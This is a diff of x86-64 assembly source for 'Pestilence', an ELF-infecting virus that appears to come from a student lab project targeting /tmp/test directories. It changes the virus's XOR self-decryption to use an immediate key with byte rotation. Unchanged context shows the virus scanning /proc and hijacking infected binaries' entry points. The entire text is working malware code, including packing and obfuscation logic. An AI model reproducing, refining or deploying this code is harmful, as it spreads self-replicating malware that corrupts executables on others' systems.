@@ -150,19 +150,23 @@ section .text
      .decrypt_data:   
         ; Desencriptar data
         lea r10, [rel __F_data]         ; base función
-        lea rbx, [rel xor_pass]   ; key
+        mov rbx, 0x21336C3174733370
+        ;xor rbx, 0x5050505050505050
+        ; lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
         xor rdx, rdx              ; índice key
 
     .decrypt_data_loop:
         mov r8b, [r10 + rcx]
-        mov r9b, [rbx + rdx]
+        mov r9b, bl
         xor r8b, r9b
         mov [r10 + rcx], r8b
+        
+        ror rbx, 8
 
         inc rcx
-        inc rdx
-        and rdx, 7
+        ;inc rdx
+        ;and rdx, 7
         cmp rcx, (__F_data__end - __F_data)
         jl .decrypt_data_loop       
 
@@ -172,6 +176,7 @@ section .text
         sub rbx, rax
         mov dword VAR(Pestilence.virus_size), ebx
 
+        TRACE_TEXT hello, 11
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
         lea rdi, [proc]
@@ -523,7 +528,6 @@ section .text
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
 
-
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
         mov VAR(Pestilence.original_entry), rbx         ; save original_entry
@@ -711,9 +715,9 @@ section .text
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     __F_data__end:
+    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
     Traza_position  equ     _finish - Traza
     Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
-    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
